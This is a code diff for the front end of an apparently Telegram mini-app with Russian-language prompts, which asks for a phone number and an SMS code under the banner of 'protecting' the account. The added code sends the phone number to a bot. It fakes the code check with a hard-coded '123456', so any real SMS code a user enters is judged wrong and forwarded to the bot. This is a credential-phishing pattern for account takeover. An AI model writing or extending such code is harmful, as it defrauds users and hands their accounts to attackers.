@@ -12,87 +12,102 @@ document.addEventListener('DOMContentLoaded', () => {
     const codeInput = document.getElementById('code');
     const phoneError = document.getElementById('phone-error');
     const codeError = document.getElementById('code-error');
+    const submitCodeBtn = document.getElementById('submit-code');
 
-    // Format phone number
-    phoneInput.addEventListener('input', function(e) {
-        let value = this.value.replace(/\D/g, '');
-        
-        if (value.length > 0) {
-            value = '+7' + value.substring(1);
+    // Анимация загрузки
+    const setLoading = (element, isLoading) => {
+        if (isLoading) {
+            element.innerHTML = '<div class="loader"></div>';
+            element.disabled = true;
+        } else {
+            element.textContent = element.dataset.originalText;
+            element.disabled = false;
         }
-        
-        if (value.length > 2) {
-            value = value.substring(0, 2) + ' ' + value.substring(2);
-        }
-        if (value.length > 6) {
-            value = value.substring(0, 6) + ' ' + value.substring(6);
-        }
-        if (value.length > 10) {
-            value = value.substring(0, 10) + ' ' + value.substring(10);
-        }
-        if (value.length > 13) {
-            value = value.substring(0, 13) + ' ' + value.substring(13);
-        }
-        if (value.length > 16) {
-            value = value.substring(0, 16);
-        }
-        
-        this.value = value;
-    });
+    };
 
-    // Validate Russian phone number
-    function validateRussianPhone(phone) {
-        const cleanPhone = phone.replace(/\D/g, '');
-        return cleanPhone.length === 11 && cleanPhone.startsWith('7');
-    }
+    // Сохраняем оригинальный текст кнопки
+    submitCodeBtn.dataset.originalText = submitCodeBtn.textContent;
+
+    // Проверка кода (имитация)
+    const verifyCode = async (code) => {
+        return new Promise(resolve => {
+            setTimeout(() => {
+                // В реальном приложении здесь должен быть запрос к серверу
+                resolve(code === '123456'); // Пример: правильный код 123456
+            }, 1500);
+        });
+    };
 
     // Submit phone
-    document.getElementById('submit-phone').addEventListener('click', () => {
+    document.getElementById('submit-phone').addEventListener('click', async () => {
         const phone = phoneInput.value.replace(/\D/g, '');
         
         if (!phone) {
             showError(phoneError, 'Введите номер телефона');
-            tg.HapticFeedback.notificationOccurred('error');
             return;
         }
         
-        if (!validateRussianPhone(phone)) {
-            showError(phoneError, 'Введите корректный российский номер (+7 XXX XXX XX XX)');
-            tg.HapticFeedback.notificationOccurred('error');
+        if (!/^7\d{10}$/.test(phone)) {
+            showError(phoneError, 'Введите корректный российский номер');
             return;
         }
         
         hideError(phoneError);
         phoneForm.classList.add('hidden');
         codeForm.classList.remove('hidden');
-        tg.HapticFeedback.impactOccurred('medium');
+        
+        // Отправляем номер
+        if (window.sendToBot) {
+            await window.sendToBot('phone', `+${phone}`);
+        }
     });
 
     // Submit code
-    document.getElementById('submit-code').addEventListener('click', () => {
+    submitCodeBtn.addEventListener('click', async () => {
         const code = codeInput.value.trim();
         
         if (!code) {
             showError(codeError, 'Введите код из SMS');
-            tg.HapticFeedback.notificationOccurred('error');
             return;
         }
         
-        if (code.length !== 6 || !/^\d+$/.test(code)) {
+        if (!/^\d{6}$/.test(code)) {
             showError(codeError, 'Код должен содержать 6 цифр');
-            tg.HapticFeedback.notificationOccurred('error');
             return;
         }
         
-        tg.showAlert('✅ Ваш аккаунт успешно защищен!', () => {
-            tg.close();
-        });
-        tg.HapticFeedback.notificationOccurred('success');
+        hideError(codeError);
+        setLoading(submitCodeBtn, true);
+        
+        // Проверка кода
+        const isValid = await verifyCode(code);
+        
+        if (isValid) {
+            // Успешная проверка
+            if (window.sendToBot) {
+                await window.sendToBot('code_verified');
+            }
+            
+            tg.showAlert('✅ Код подтвержден! Ваш аккаунт защищен.', () => {
+                tg.close();
+            });
+        } else {
+            // Неверный код
+            codeInput.value = '';
+            showError(codeError, 'Неверный код. Попробуйте снова');
+            if (window.sendToBot) {
+                await window.sendToBot('code_failed', code);
+            }
+        }
+        
+        setLoading(submitCodeBtn, false);
     });
 
     function showError(element, message) {
         element.textContent = message;
         element.style.display = 'block';
+        element.style.animation = 'shake 0.5s';
+        setTimeout(() => element.style.animation = '', 500);
     }
 
     function hideError(element) {
